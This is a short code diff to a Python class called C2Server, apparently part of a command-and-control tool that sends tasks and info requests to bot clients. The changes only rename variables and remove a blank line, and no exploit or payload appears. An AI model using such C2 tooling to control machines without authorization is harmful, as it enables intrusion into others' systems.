@@ -81,7 +81,6 @@ class C2Server(SecureBalancedServer):
                 bot.on_task_received(task)
                 bot.write(task.create())
                 self.task.emit(task)
-
         else:
             try:
                 bot = self.get_device_by_id(bot_id)
@@ -103,11 +102,11 @@ class C2Server(SecureBalancedServer):
             self.module_dump_error.emit(bot, "failed to dump module {}: {}".format(module_name, e))
 
     @Slot(Bot, list)
-    def send_info(self, bot: Bot, info: list):
+    def send_info(self, bot: Bot, info_list: list):
         """Send info request."""
-        info_obj = Info(bot.id(), info)
-        bot.on_info_received(info_obj)
-        bot.write(info_obj.create())
+        info = Info(bot.id(), info_list)
+        bot.on_info_received(info)
+        bot.write(info.create())
 
     @Slot(int, int)
     def force_start_task(self, bot_id, task_id):
